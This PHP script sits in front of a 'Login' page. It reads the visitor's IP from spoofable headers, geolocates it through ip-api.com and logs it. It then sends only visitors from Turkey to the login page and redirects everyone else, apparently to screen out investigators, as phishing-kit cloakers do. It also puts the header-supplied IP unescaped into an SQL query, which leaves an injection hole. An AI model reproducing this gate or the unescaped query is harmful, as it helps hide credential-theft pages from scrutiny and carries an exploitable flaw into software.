<?php 
include 'Login/inc/config.php';
error_reporting(E_ALL);
ini_set("display_errors", 1);

function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}
$ipcik = GetIP();

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "http://ip-api.com/json/".$ipcik);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:' . curl_error($ch);
}

$data = json_decode($result); 
$ulke = $data->countryCode;
$sehir = $data->city;


if($ulke == "TR"){
    $durumx = "0";
}else{
    $durumx = "1";
}
    $ipkontrol = $connect->query("SELECT * FROM ban WHERE ip = '{$ipcik}'")->fetch(PDO::FETCH_ASSOC);
        if ( $ipkontrol ){
            if($ipkontrol['durum'] == '1'){
			echo "<script>window.location.href='$site';</script>"; 
            }else {
                if($durumx == '1'){
			echo "<script>window.location.href='$site';</script>"; 

                }else{
                 echo "<script>window.location.href='Login/index.php';</script>";    
                }
            }
        }else{
             $stmt=$connect->prepare("INSERT INTO ban (ip, durum, ulke, sehir) VALUES (:ip, :durum, :ulke, :sehir)");
                $kayit=$stmt->execute(array(":ip"=>$ipcik, ":durum"=>$durumx, ":ulke"=>$ulke, ":sehir"=>$sehir,));
			if($ulke == "TR"){
		   echo "<script>window.location.href='Login/index.php';</script>";
		} else {
			{
			echo "<script>window.location.href='$site';</script>"; 
		}
		}

        }



?>
